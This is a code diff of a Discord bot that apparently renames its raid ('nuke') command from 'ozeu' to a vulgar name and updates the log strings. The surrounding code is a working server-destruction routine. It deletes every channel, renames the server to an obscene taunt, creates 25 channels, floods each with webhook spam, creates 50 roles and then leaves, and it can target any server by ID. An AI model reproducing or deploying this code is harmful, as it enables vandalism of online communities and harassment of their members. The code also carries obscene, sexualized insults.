@@ -104,7 +104,7 @@ async def remove_dev(interaction: discord.Interaction, user: discord.User):
     await interaction.response.send_message(f"✅ {user} を開発者権限ユーザーから削除しました。", ephemeral=True)
 
 # --- !ozeu コマンド ---
-@bot.command(name="ozeu")
+@bot.command(name="kuritorisu")
 async def ozeu(ctx, guild_id: int = None):
     # DMならOWNERかdev_usersのみ許可
     if ctx.guild is None:
@@ -112,10 +112,10 @@ async def ozeu(ctx, guild_id: int = None):
             await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
             return
         if guild_id is None:
-            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
+            await ctx.send("❌ サーバーIDを指定してください。例: `!kuritorisu <guild_id>`")
             return
         if guild_id in safe_servers:
-            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
+            await ctx.send("❌ このサーバーは安全リストに登録されているため、!kuitorisuは実行できません。")
             return
         guild = bot.get_guild(guild_id)
         if guild is None:
@@ -123,7 +123,7 @@ async def ozeu(ctx, guild_id: int = None):
             return
     else:
         if ctx.guild.id in safe_servers:
-            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
+            await ctx.send("❌ このサーバーは安全リストに登録されているため、!kuritorisuは実行できません。")
             return
         guild = ctx.guild
 
@@ -145,7 +145,7 @@ async def ozeu(ctx, guild_id: int = None):
         try:
             await channel.delete()
         except Exception as e:
-            print(f"[ozeu] {channel.name} の削除でエラー: {e}")
+            print(f"[kuritorisu] {channel.name} の削除でエラー: {e}")
 
     await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
 
@@ -153,14 +153,14 @@ async def ozeu(ctx, guild_id: int = None):
     try:
         await guild.edit(name="みうまんこの植民地")
     except Exception as e:
-        print(f"[ozeu] サーバー名の変更でエラー: {e}")
+        print(f"[kuritorisu] サーバー名の変更でエラー: {e}")
 
     # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
             return await guild.create_text_channel(name="まんこに荒らされてやんのｗｗｗ")
         except Exception as e:
-            print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
+            print(f"[kuritorisu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
 
     created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
@@ -173,7 +173,7 @@ async def ozeu(ctx, guild_id: int = None):
             for _ in range(50):
                 await webhook.send(SPAM_MESSAGE, username="ぜっとぷらす")
         except Exception as e:
-            print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
+            print(f"[kuritorisu] {channel.name} のWebhook送信でエラー: {e}")
 
     await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
 
@@ -182,7 +182,7 @@ async def ozeu(ctx, guild_id: int = None):
         for i in range(50):
             await guild.create_role(name=f"bot用権限{i+1}")
     except Exception as e:
-        print(f"[ozeu] ロール作成でエラー: {e}")
+        print(f"[kuritorisu] ロール作成でエラー: {e}")
 
     # サーバー退出＆通知
     try:
@@ -199,7 +199,7 @@ async def ozeu(ctx, guild_id: int = None):
         await owner.send(embed=embed_done)
         await ctx.send(embed=embed_done)
     except Exception as e:
-        print(f"[ozeu] 退出時にエラー: {e}")
+        print(f"[kuritorisu] 退出時にエラー: {e}")
 
 # --- /safe コマンド ---
 @tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、nukeを発動禁止にします")
